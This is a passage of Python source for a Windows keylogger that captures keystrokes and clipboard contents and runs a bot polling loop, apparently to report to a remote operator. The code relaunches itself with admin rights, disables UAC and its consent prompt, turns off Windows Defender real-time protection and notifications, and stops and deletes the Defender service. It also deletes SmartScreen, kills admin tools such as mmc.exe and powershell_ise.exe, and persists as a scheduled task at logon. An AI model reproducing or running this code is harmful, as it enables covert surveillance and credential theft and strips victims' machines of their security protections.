            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != previous_clipboard_content:
                previous_clipboard_content = current_clipboard_content
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                log_message(f'[{timestamp}] Clipboard Content: {current_clipboard_content}', log_type='clipboard')
            time.sleep(1)
    except Exception as e:
        log_message(f"Error in monitor_clipboard: {e}", 'error')
        time.sleep(5)

def finalize_session(signum=None, frame=None):
    try:
        log_sentence()
        log_message('### Keylogger Log - Session End ###')
    except Exception as e:
        log_message(f"Error in finalize_session: {e}", 'error')

def monitor_processes():
    while True:
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] in ['mmc.exe', 'powershell_ise.exe']:
                    try:
                        proc.terminate()
                    except Exception as e:
                        log_message(f"Error terminating {proc.info['name']}: {e}", 'error')
        except Exception as e:
            log_message(f"Error in monitor_processes: {e}", 'error')
        time.sleep(0.1)

def run_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def disable_uac():
    script_path = None 

    try:
        reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")

    try:
        try:
            value, _ = winreg.QueryValueEx(reg_key, "EnableLUA")
            if value == 0:
                return
        except FileNotFoundError:
            pass
        
        powershell_script = """
        reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v EnableLUA /t REG_DWORD /d 0 /f
        """
        
        script_path = os.path.join(os.getenv('TEMP'), 'disable_uac.ps1')
        
        with open(script_path, 'w') as script_file:
            script_file.write(powershell_script)
        
        result = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
            shell=True,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode != 0:
            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
        
    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        winreg.CloseKey(reg_key)
        if script_path and os.path.exists(script_path):
            os.remove(script_path)

def disable_uac_prompt():
    script_path = None

    try:
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")

    try:
        try:
            value, _ = winreg.QueryValueEx(reg_key, "ConsentPromptBehaviorAdmin")
            if value == 0:
                return
        except FileNotFoundError:
            pass
        
        powershell_script = """
        reg add 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
        """
        
        script_path = os.path.join(os.getenv('TEMP'), 'disable_uac_prompt.ps1')
        
        with open(script_path, 'w') as script_file:
            script_file.write(powershell_script)
        
        result = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
            shell=True,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode != 0:
            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
        
    except Exception as e:
        pass

    finally:
        winreg.CloseKey(reg_key)
        if script_path and os.path.exists(script_path):
            os.remove(script_path)

def suppress_windows_defender_notifications():
    script_path = None

    try:
        reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Microsoft\Windows Defender\UX Configuration", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Microsoft\Windows Defender\UX Configuration")

    try:
        try:
            value, _ = winreg.QueryValueEx(reg_key, "Notification_Suppress")
            if value == 1:
                return
        except FileNotFoundError:
            pass
        
        powershell_script = """
        reg add "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f
        """
        
        script_path = os.path.join(os.getenv('TEMP'), 'suppress_windows_defender_notifications.ps1')
        
        with open(script_path, 'w') as script_file:
            script_file.write(powershell_script)
        
        result = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
            shell=True,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode != 0:
            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
        
    except Exception as e:
        pass

    finally:
        winreg.CloseKey(reg_key)
        if script_path and os.path.exists(script_path):
            os.remove(script_path)

def disable_defender_realtime_protection():
    script_path = None

    try:
        reg_key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", 0, winreg.KEY_READ | winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")

    try:
        try:
            value, _ = winreg.QueryValueEx(reg_key, "DisableRealtimeMonitoring")
            if value == 1:
                return
        except FileNotFoundError:
            pass
        
        powershell_script = """
        reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
        """
        
        script_path = os.path.join(os.getenv('TEMP'), 'disable_defender_realtime_protection.ps1')
        
        with open(script_path, 'w') as script_file:
            script_file.write(powershell_script)
        
        result = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
            shell=True,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode != 0:
            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
        
    except Exception as e:
        pass

    finally:
        winreg.CloseKey(reg_key)
        if script_path and os.path.exists(script_path):
            os.remove(script_path)

def manage_windows_defender():
    check_service = subprocess.run(
        ["sc", "query", "WinDefend"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    if "does not exist" in check_service.stderr.decode('utf-8'):
        print("Windows Defender service does not exist. Continuing with other commands.")

    commands = [
        ["sc", "config", "WinDefend", "start=", "disabled"],
        ["sc", "stop", "WinDefend"],
        ["sc", "delete", "WinDefend"]
    ]

    for command in commands:
        try:
            result = subprocess.run(
                command, shell=False,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            print(f"Command: {' '.join(command)}")
            print(f"stdout: {result.stdout.decode('utf-8')}")
            print(f"stderr: {result.stderr.decode('utf-8')}")

            if result.returncode != 0:
                error_msg = f"Error running command: {' '.join(command)}\n"
                error_msg += f"stderr: {result.stderr.decode('utf-8')}\n"
                error_msg += f"stdout: {result.stdout.decode('utf-8')}"
                print(error_msg)
            else:
                print(f"Command executed successfully: {' '.join(command)}")

        except Exception as e:
            print(f"Unhandled exception while executing command {' '.join(command)}: {e}")

def manage_smartscreen():
    try:
        powershell_script = """
        takeown /f "%systemroot%\\System32\\smartscreen.exe" /a
        icacls "%systemroot%\\System32\\smartscreen.exe" /grant:r Administrators:F /c
        taskkill /im smartscreen.exe /f
        del "%systemroot%\\System32\\smartscreen.exe" /s /f /q
        """
        
        script_path = os.path.join(os.getenv('TEMP'), 'manage_smartscreen.ps1')
        
        with open(script_path, 'w') as script_file:
            script_file.write(powershell_script)
        
        result = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
            shell=True,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode != 0:
            raise Exception(f"Error running PowerShell script: {result.stderr.decode('utf-8')}")
        
    except Exception as e:
        pass

    finally:
        if os.path.exists(script_path):
            os.remove(script_path)

def task_exists(task_name):
    try:
        result = subprocess.run(f"schtasks /query /tn \"{task_name}\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.returncode == 0
    except Exception as e:
        print(f"Error checking task existence: {e}")
        return False

def add_to_startup():
    try:
        app_path = sys.executable
        task_name = os.path.basename(app_path)

        if task_exists(task_name):
            print(f"The task '{task_name}' already exists. No need to add it again.")
            return
        
        task_command = f"schtasks /create /tn \"{task_name}\" /tr \"'{app_path}'\" /sc onlogon /rl highest /f"
        subprocess.run(task_command, shell=True, check=True)
        
        print(f"{task_name} added to startup as a scheduled task.")
    except Exception as e:
        print(f"Failed to add {task_name} to startup as a scheduled task: {e}")

if __name__ == '__main__':
    if not run_as_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        while not run_as_admin():
            time.sleep(0.1)

    disable_uac()
    disable_uac_prompt()
    disable_defender_realtime_protection()
    manage_windows_defender()
    manage_smartscreen()
    suppress_windows_defender_notifications()
    add_to_startup()

    session_files = create_session_files()
    sentence = ''
    previous_clipboard_content = ''

    start_message()
    threading.Thread(target=monitor_active_window, daemon=True).start()
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=monitor_processes, daemon=True).start()
    keyboard.on_press(on_key_press)
    signal.signal(signal.SIGINT, finalize_session)
    atexit.register(finalize_session)

    while True:
        try:
            bot.polling(none_stop=True, timeout=30)
        except requests.exceptions.ReadTimeout:
            log_message("Error: Bot polling timeout. Retrying...", 'error')
            time.sleep(2)
        except requests.exceptions.RequestException as e:
            log_message(f"Error in bot polling: {e}", 'error')
            time.sleep(2)
        except Exception as e:
            log_message(f"Unexpected error in bot polling: {e}", 'error')
            time.sleep(2)
